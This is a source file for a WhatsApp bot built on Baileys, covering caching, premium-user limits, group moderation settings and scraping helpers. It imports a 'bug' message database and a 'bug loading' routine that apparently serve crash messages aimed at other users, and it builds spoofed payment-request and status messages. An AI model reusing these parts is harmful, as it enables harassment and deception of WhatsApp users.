

require('./lib/listmenu')
const {
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
} = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const { color } = require('./lib/color')
const chalk = require('chalk')
const moment = require('moment-timezone')
const cron = require('node-cron')
const speed = require('performance-now')
const ms = require('ms')
const toMs = ms
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')
const jsobfus = require('javascript-obfuscator')
const {translate} = require('@vitalets/google-translate-api')
const scp2 = require('./lib/scraper2') 
const absenData = {};
const { temporary, temmp } = require('./tempor')
const quotes = JSON.parse(fs.readFileSync('./database/quotes.json'))
const premiumPath = './src/data/role/premium.json';
const questions = require("./database/tekaTeki");  // Mengimpor pertanyaan dari file tekaTeki.js

// ========== V2 ==========
const v2CachePath = './forwarded_v2.json'
let forwardedV2 = {}
if (fs.existsSync(v2CachePath)) {
    try {
        forwardedV2 = JSON.parse(fs.readFileSync(v2CachePath))
    } catch (e) {
        console.log('Gagal membaca cache forwarding V2:', e)
    }
}

function saveForwardedV2() {
    fs.writeFileSync(v2CachePath, JSON.stringify(forwardedV2, null, 2))
}
const patrickCachePath = './forwarded_patrick.json'
let forwardedPatrick = {}
if (fs.existsSync(patrickCachePath)) {
    try {
        forwardedPatrick = JSON.parse(fs.readFileSync(patrickCachePath))
    } catch (e) {
        console.log('Gagal membaca cache forwarding Patrick:', e)
    }
}

function saveForwardedPatrick() {
    fs.writeFileSync(patrickCachePath, JSON.stringify(forwardedPatrick, null, 2))
}
const makananCachePath = './forwarded_makanan.json'
let forwardedMakanan = {}
if (fs.existsSync(makananCachePath)) {
    try {
        forwardedMakanan = JSON.parse(fs.readFileSync(makananCachePath))
    } catch (e) {
        console.log('Gagal membaca cache forwarding Makanan:', e)
    }
}

function saveForwardedMakanan() {
    fs.writeFileSync(makananCachePath, JSON.stringify(forwardedMakanan, null, 2))
}
const kucingCachePath = './forwarded_kucing.json'
let forwardedKucing = {}
if (fs.existsSync(kucingCachePath)) {
    try {
        forwardedKucing = JSON.parse(fs.readFileSync(kucingCachePath))
    } catch (e) {
        console.log('Gagal membaca cache forwarding Kucing:', e)
    }
}

function saveForwardedKucing() {
    fs.writeFileSync(kucingCachePath, JSON.stringify(forwardedKucing, null, 2))
}
const v1CachePath = './forwarded_v1.json'
let forwardedV1 = {}
if (fs.existsSync(v1CachePath)) {
    try {
        forwardedV1 = JSON.parse(fs.readFileSync(v1CachePath))
    } catch (e) {
        console.log('Gagal membaca cache forwarding V1:', e)
    }
}

function saveForwardedV1() {
    fs.writeFileSync(v1CachePath, JSON.stringify(forwardedV1, null, 2))
}
const jomokCachePath = './forwarded_jomok.json'
// Baca cache forwarding
let forwardedJomok = {}
if (fs.existsSync(jomokCachePath)) {
    try {
        forwardedJomok = JSON.parse(fs.readFileSync(jomokCachePath))
    } catch (e) {
        console.log('Gagal membaca cache forwarding Jomok:', e)
    }
}

// Simpan cache forwarding
function saveForwardedJomok() {
    fs.writeFileSync(jomokCachePath, JSON.stringify(forwardedJomok, null, 2))
}
const islamiCachePath = './forwarded_islami.json'
// Baca cache forwarding
let forwardedIslami = {}
if (fs.existsSync(islamiCachePath)) {
    try {
        forwardedIslami = JSON.parse(fs.readFileSync(islamiCachePath))
    } catch (e) {
        console.log('Gagal membaca cache forwarding Islami:', e)
    }
}

// Simpan cache forwarding
function saveForwardedIslami() {
    fs.writeFileSync(islamiCachePath, JSON.stringify(forwardedIslami, null, 2))
}

// ... lanjut ke bagian handler switch/case

const sentStickersPath = './sentStickers.json'

let sentStickers = {}
if (fs.existsSync(sentStickersPath)) {
    try {
        sentStickers = JSON.parse(fs.readFileSync(sentStickersPath, 'utf-8'))
    } catch (err) {
        console.log('Gagal membaca file sentStickers.json:', err)
    }
}

function saveSentStickers() {
    fs.writeFileSync(sentStickersPath, JSON.stringify(sentStickers, null, 2))
}

const sentImagesPath = './sentImages.json'

let sentImages = {}
if (fs.existsSync(sentImagesPath)) {
    try {
        sentImages = JSON.parse(fs.readFileSync(sentImagesPath, 'utf-8'))
    } catch (err) {
        console.log('Gagal membaca file sentImages.json:', err)
    }
}

function saveSentImages() {
    fs.writeFileSync(sentImagesPath, JSON.stringify(sentImages, null, 2))
}

const sentDocsPath = './sentDocs.json'

let sentDocs = {}
if (fs.existsSync(sentDocsPath)) {
    try {
        sentDocs = JSON.parse(fs.readFileSync(sentDocsPath, 'utf-8'))
    } catch (err) {
        console.log('Gagal membaca file sentDocs.json:', err)
    }
}

function saveSentDocs() {
    fs.writeFileSync(sentDocsPath, JSON.stringify(sentDocs, null, 2))
}

// Fungsi untuk memilih pertanyaan secara acak
function getRandomQuestion() {
    return questions[Math.floor(Math.random() * questions.length)];
}
const {
    exec,
    spawn,
    execSync
} = require("child_process")
// ========== LIMIT STICKER ==========

// Pastikan db.data itu ada
if (!db.data) db.data = {};

// Pastikan db.data.limitstiker itu ada
if (!db.data.limitstiker) db.data.limitstiker = {};

const limitData = db.data.limitstiker;
global.limitData = limitData; // <<=== Tambahkan ini!!
const dailyLimit = 3; // limit harian untuk user biasa

const resetDailyLimit = () => {
    const now = new Date();
    const nextReset = new Date();
    nextReset.setHours(24, 0, 0, 0); // jam 00:00

    const msUntilReset = nextReset.getTime() - now.getTime();

    setTimeout(() => {
        for (const user in limitData) {
            limitData[user] = 0;
        }
        console.log('>>> Reset limit sticker harian semua user!');
        db.data.limitstiker = limitData;
        db.write(); // simpan db
        resetDailyLimit(); // set lagi buat hari berikutnya
    }, msUntilReset);
};
resetDailyLimit();
// === DI LUAR handler utama / sebelum exports atau handle connection ===
// Map untuk menyimpan peringatan pelanggaran anti-video
global.antiVideoWarnings = new Map()

// Cron untuk reset data setiap dua hari jam 7 pagi

function resetAllWarnings() {
    // Reset warning video
    global.antiVideoWarnings.clear()

    // Reset warning user
    let users = db.data.users
    let resetCount = 0

    for (let user in users) {
        if (typeof users[user] !== 'object') continue

        // Inisialisasi kalau belum ada
        if (typeof users[user].warning !== 'number') users[user].warning = 0
        if (typeof users[user].warningLink !== 'number') users[user].warningLink = 0

        users[user].warning = 0
        users[user].warningLink = 0
        resetCount++
    }

    const time = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss')
    console.log(`[AUTO-RESET] Semua warning telah direset (${resetCount} user) pada ${time} (tiap 2 hari)`)
}

// Jadwalkan reset setiap 2 hari sekali jam 7 pagi WIB
cron.schedule('0 7 */7 * *', resetAllWarnings, {
    timezone: 'Asia/Jakarta'
})
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./lib/uploader')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./lib/converter')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
    totalcase
} = require('./lib/myfunc')

//prem owner function
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')
//data
let ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'))
let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'))
const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'))
//media
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonvn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonsticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonimage.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonvideo.json'))
const DocXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/apk.json'))

//bug database
const { xeontext1 } = require('./src/data/function/XBug/xeontext1')
const { xeontext2 } = require('./src/data/function/XBug/xeontext2')
const { xeontext3 } = require('./src/data/function/XBug/xeontext3')
const { xeontext4 } = require('./src/data/function/XBug/xeontext4')
const { xeontext5 } = require('./src/data/function/XBug/xeontext5')

const xeonverifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 
//function
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
//module
module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix
        const isCmd = body.startsWith(prefix, '')
        const isCmd2 = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const command2 = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const xeonybody = body.startsWith(pric)
        const isCommand = xeonybody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        //anti media
        const isXeonMedia = m.mtype
        //user status
        const isUser = xeonverifieduser.includes(sender)
        const XeonTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= XeonTheCreator || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(XeonBotInc, m, premium)
        
        //theme sticker reply
        const XeonStickWait = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/wait.webp')
        XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickAdmin = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/admin.webp')
        XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickBotAdmin = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/botadmin.webp')
        XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickOwner = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/owner.webp')
        XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickGroup = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/group.webp')
        XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickPrivate = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/private.webp')
        XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        //premium
        async function replyprem(teks) {
    replygcxeon(`*Fitur ini hanya khusus untuk user premium. hubungi admin untuk membeli fitur premiumnya*`)
}
        //script replier
        async function sendXeonBotIncMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await XeonBotInc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
        //reply
        async function replygcxeon(teks) {
            if (typereply === 'v1') {
                m.reply(teks)
            } else if (typereply === 'v2') {
                XeonBotInc.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                            sourceUrl: wagc
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });
            } else if (typereply === 'v3') {
               XeonBotInc.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: ownername,
                        thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        sourceUrl: websitex,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: m })
            }
        }
        let fstatus = { 
            key: { 
               fromMe: false, 
               participant: `0@s.whatsapp.net`,  
               ...(m.chat ? {  remoteJid: "status@broadcast"  } : {}) 
            }, 
               message: {  
                  "imageMessage": { 
                     "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", 
                     "mimetype": "image/jpeg", 
                     "caption": botname,
                     "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", 
                     "fileLength": "28777",
                     "height": 1080,
                     "width": 1079,
                     "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                     "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                     "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                     "mediaKeyTimestamp": "1610993486",
                     "jpegThumbnail": await reSize(thumb, 100, 100),
                     "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                  }
               }
            }
            
            //Fake quoted
        const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id:global.botname, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.botname}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
	    const frpayment = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}
            
            const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
        
        //database
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? 1000 : 100
            let user = global.db.data.users[sender]
            if (typeof user !== 'object') global.db.data.users[sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('badword' in user)) user.badword = 0
                if (!('title' in user)) user.title = ''
                if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex') 
                if (!('afkReason' in user)) user.afkReason = ''
                if (!('nick' in user)) user.nick = XeonBotInc.getName(sender)
                if (!isPremium) user.premium = false
                if (!('totalLimit' in user)) user.totalLimit = 0
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[sender] = {
               serialNumber: randomBytes(16).toString('hex'),
               title: `${isPremium ? 'Premium' : 'User'}`,
               afkTime: -1,
               badword: 0,
               afkReason: '',
               nick: XeonBotInc.getName(sender),
               premium: `${isPremium ? 'true' : 'false'}`,
               limit: limitUser,
               totalLimit: 0
            }
            
               let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                  if (!('badword' in chats)) chats.badword = true
                  if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
                  if (!('antibot' in chats)) chats.antibot = true
                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antivirtex' in chats)) chats.antivirtex = true
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = true
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = true
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = true
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('antidocument' in chats)) chats.antidocument = true
                  if (!('antilink' in chats)) chats.antilink = true
                  if (!('antilinkgc' in chats)) chats.antilinkgc = true
               } else global.db.data.chats[from] = {
                  badword: true,
                  antiforeignnum: false,
                  antibot: true,
                  antiviewonce: false,
                  antivirtex: true,
                  antimedia: false,
                  antiimage: false,
                  antivideo: true,
                  antiaudio: false,
                  antipoll: true,
                  antisticker: false,
                  antilocation: false,
                  antidocument: true,
                  anticontact: false,
                  antilink: true,
                  antilinkgc: true
               }
            
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autobio' in setting)) setting.autobio = false 
               if (!('autoread' in setting)) setting.autoread = false
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindia' in setting)) setting.onlyindia = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
               if (!('watermark' in setting)) setting.watermark = { packname , author }
               if (!('about' in setting)) setting.about = { bot: { nick: XeonBotInc.getName(botNumber), alias: botname}, owner: { nick: XeonBotInc.getName(global.ownernumber + '@s.whatsapp.net'), alias: global.ownernumber}}
            } else global.db.data.settings[botNumber] = {
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autobio: false,
               autoread: false,
               autoblocknum: false,
               onlyindia: false,
               onlyindo: false,
               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,
               watermark: {
                  packname: global.packname, 
                  author: global.author
               },
               about: {
                  bot: {
                     nick: XeonBotInc.getName(botNumber), 
                     alias: botname
                  },
                  owner: {
                     nick: XeonBotInc.getName(global.ownernumber + '@s.whatsapp.net'), 
                     alias: global.ownernumber
                  }
               }
            }
            
        } catch (err) {
            console.log(err)
        }
        
        async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

  const { jadibot, conns } = require('./jadibot')      
//bug loading
async function loading () {
var xeonlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"Hiraa otw bug🐦..."
]
let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key })
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
        
        async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcxeon('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
